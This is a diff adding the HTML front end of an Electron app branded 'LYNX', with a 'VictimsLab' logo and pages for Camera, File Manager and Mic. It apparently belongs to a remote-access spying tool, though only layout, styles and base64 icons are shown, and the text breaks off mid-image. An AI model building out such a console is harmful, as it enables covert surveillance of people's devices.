@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html ng-app="myappy">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">
+        <title>Lab</title>
+        <script>
+    if (typeof module === "object") {
+      window.module = module;
+      module = undefined;
+    }
+        </script>
+        <script type="text/javascript" src="assets/js/lib/jquery-3.1.1.min.js"></script>
+        <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
+        <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
+        <script type="text/javascript" src="../node_modules/angular-route/angular-route.min.js"></script>
+        <script type="text/javascript" src="assets/js/lib/ng-infinite-scroll.min.js"></script>
+        <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
+        <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>
+        <!-- Insert this line after script imports -->
+        <script>
+    if (window.module) module = window.module;
+        </script>
+        <link rel="stylesheet" href="assets/css/mystyle.css">
+        <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css">
+        <link rel="stylesheet" href="assets/css/leaflet.css">
+        <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .main-container {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+
+
+    .content-area {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      overflow: hidden;
+      padding: 0 20px 20px 0px;
+    }
+
+    #logy {
+      overflow-y: auto;
+      overflow-x: hidden;
+      position: relative;
+      height: calc(100vh - 105px);
+      width: 400px;
+      background-color: #202128;
+      color: #ffffff;
+      padding: 20px 20px 150px 0px;
+      box-sizing: border-box;
+      z-index: 999;
+      margin-top: 105px;
+      border-radius: 4px;
+      flex-shrink: 0;
+    }
+
+    .log {
+      margin-bottom: 8px;
+      word-wrap: break-word;
+    }
+
+    .main-content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+
+
+    .content-view {
+      flex: 1;
+      overflow-y: auto;
+      overflow-x: hidden;
+    }
+
+    .headermain {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      height: 100px;
+      margin-top: 10px;
+    }
+
+    .logo {
+      height: 100px;
+      width: 400px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .navigation {
+      width: calc(100% - 400px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 30px;
+    }
+
+    .item {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-content: center;
+      padding: 8px;
+      width: 120px;
+      height: 100px;
+      border-radius: 8px;
+      gap: 8px;
+    }
+
+    .item:hover {
+      cursor: pointer;
+      background-color: #337EC9;
+    }
+
+    .item:hover .item-text{
+      color: #ffffff;
+    }
+
+    .item-text {
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+      font-size: 16px;
+      line-height: 100%;
+      text-align: center;
+      vertical-align: middle;
+      color: #5E6566;
+    }
+
+    .item-icon {
+      height: 32px;
+      width: 32px;
+    }
+        </style>
+    </head>
+    <body ng-controller="LabCtrl" class="draggable">
+        <div class="main-container">
+            <div class="content-area notDraggable">
+                <div class="headermain">
+                    <div class="logo">
+                        <div style="display: flex; justify-content:flex-start; align-items: center; gap: 20px; height: 100px; padding: 0px 10px;">
+                            <img src="assets/img/VictimsLab.png" style="
+                              width: 55px;
+                              height: 62px;
+                                  ">
+                            <div style="
+                                      font-size: 40px; 
+                                      color: #ffffff; 
+                                      font-weight: 800;
+                                      font-family: 'Inter', sans-serif;
+                                  ">LYNX</div>
+                        </div>
+                        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+                    </div>
+                    <div class="navigation">
+                        <a class="item" ng-click="goToPage('camera')">
+                            <div class="item-icon">
+                                <svg
+                                    width="32"
+                                    height="32"
+                                    viewBox="0 0 32 32"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                >
+                                    <rect width="32" height="32" fill="url(#pattern0_18_17)"/>
+                                    <defs>
+                                        <pattern
+                                            id="pattern0_18_17"
+                                            patternContentUnits="objectBoundingBox"
+                                            width="1"
+                                            height="1"
+                                        >
+                                            <use xlink:href="#image0_18_17" transform="scale(0.01)"/>
+                                        </pattern>
+                                        <image
+                                            id="image0_18_17"
+                                            width="100"
+                                            height="100"
+                                            preserveAspectRatio="none"
+                                            xlink:href="data:image/png;base64,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"
+                                        />
+                                    </defs>
+                                </svg>
+                            </div>
+                            <div class="item-text">Camera</div>
+                        </a>
+                        <a class="item" ng-click="goToPage('fileManager')">
+                            <div class="item-icon">
+                                <svg
+                                    width="32"
+                                    height="32"
+                                    viewBox="0 0 32 32"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                >
+                                    <rect width="32" height="32" fill="url(#pattern0_18_21)"/>
+                                    <defs>
+                                        <pattern
+                                            id="pattern0_18_21"
+                                            patternContentUnits="objectBoundingBox"
+                                            width="1"
+                                            height="1"
+                                        >
+                                            <use xlink:href="#image0_18_21" transform="scale(0.01)"/>
+                                        </pattern>
+                                        <image
+                                            id="image0_18_21"
+                                            width="100"
+                                            height="100"
+                                            preserveAspectRatio="none"
+                                            xlink:href="data:image/png;base64,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"
+                                        />
+                                    </defs>
+                                </svg>
+                            </div>
+                            <div class="item-text">File Manager</div>
+                        </a>
+                        <a class="item" ng-click="goToPage('mic')">
+                            <div class="item-icon">
+                                <svg
+                                    width="32"
+                                    height="32"
+                                    viewBox="0 0 32 32"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                >
+                                    <rect width="32" height="32" fill="url(#pattern0_155_33)"/>
+                                    <defs>
+                                        <pattern
+                                            id="pattern0_155_33"
+                                            patternContentUnits="objectBoundingBox"
+                                            width="1"
+                                            height="1"
+                                        >
+                                            <use xlink:href="#image0_155_33" transform="scale(0.015625)"/>
+                                        </pattern>
+                                        <image
+                                            id="image0_155_33"
+                                            width="64"
+                                            height="64"
+                                            preserveAspectRatio="none"
+                                            xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAK40lEQVR4nO2bbXCcV3XHf+c+u6vd1aslR5YlWbsrKbGjyHbAwWnsOISZkEmG4EBpaGHamUDp8IEyQzspzBhmWvKh05AO0E4/UOAD0ym0BDIxCZAwOHFeXMcmURLZK9mKrdWuLMtWHMvodVd69rmnHyTLkh3J1upZQWb8/yTfe8//Offv5zn3nnvPCquJu+8ONPW/82GD2aXqNQJ1njUjjjCESJeo/VU63X12NV2S1XhIQ8OmmkDI2aPKwyJULzZOVa2KOeAo/5hOJ19cDd+KLkAsccsXFH1ckCqAyspa6ptupKyihnCkDHc6R3ZyjHPvnGJosBcv71507Gl32vv86dPHzxfTv+IJcPfdgabMu98W9MsA6xtuZOtt97Cmev2iJq47zdvHXqX7yAHy7hSopjTA7v6T3V3FcrNoAsQSt/wH8CXHCfChnbtJtNx6zbaTk6O88sL/MnxuAFUdChi2p1Ld/cXwsygCxONtX1SR7xnj6Efuf1hqa2PL5sh7Li/v+wlDg72o8pbNV+wYGHg167evxm/ClpYttRYeB7j9zk8WNHmAgBPkzo/8OeUVNYhwqxMc+ztfHZ2F7wK41n5DRMrrN2wk3rJlRVyhUJjtOx8EQNX7av1NN631w8f58FWA1tbWEtQ+DMLW2z7qC2dtXZy6hlZETGXQDfyFL6Tz4KsArg3fIyLl1TXrqaqq9Y133pv0Cd9IZ+HvJ6DehwHWN97oK23Dho2ICKqyCx5y/OT2WQDTCFBe5e+nGgpFCJVEESEUiyX9e7XwWQA1WgcQCZf5SQtAJFpx8c/Fd1IFIOAnmXi2xARKeOu1fQSCL8+1hyNltG78IHX1LVflSJ88QrrvKHl3ekH75MTorMdO2E+ffRUAIFJWS23DHQva3KlJDr74JHd99DOsvWHDorapk29y5I2XqGu4nVBJ6YK+sooR+k781m93/RfAMUEqq+JXtLvuBOneo0sKMJDuoaHpTqrX3nRF3+REcbJk3zdCiyGbfZdwZOnYEImWMzk+tEoezcD3NyCbHabn6BOIXEozcrkRwpEoN928e0nbtq272P/sj+h+K00gsPBTn3Z9TwOAIggwPTVG+9adVFTdMNcWDkepqq7HyNK5V2lpBfd/6m/5/fBZpnITC/rePPyc364CRRBAgJobGrmhtqkge0cMNTX1V7QnQ/tX6Nl7w3cBAM6fG8B1p+b+XVa+hoqKa9scWauMjA5hPbug/fJl0S/4LkAgWErq7S7EXIqvU9kRyirWcNe9nyUUKFnUdmJilBee+xHutEswuDAG5PPvEwGipWvZuPmhy1qV3uPPkDr2Ops271zUtqvzJSoqW2iM77qib3LiLMk3/ttnb1dtGRRKyxqYmBxbctTkxCjRMl+3+leF72+AVY+Jy9by7MR5hs508Cd3Pbikbbx5M50d+zEmSDC0cCeYyw777SpQBAEmx8+SOfksjnOJOhItZ/vOB6hvWDpNjrdsQVH6TnSSy44v5J0c8dtVYAWHovFE209V2YU6x1R1JmQ79jZBqu752BcKXgYXw96f/ivZyVFE5TVrmVHD2AbBHMqkk38NaCG8BccAtdqKyHo13l4C3mMEvMewnC6U72ooCUcBsMb78cXnCboW0c/F423rCuVdwSegOQAxpiPTmzwIEIttGjGmhI5XnyUQDM2N9CcdngmgIs5rc8+Lt7kAnucV/B95PR32m/B6OrwIrqfD19Ph6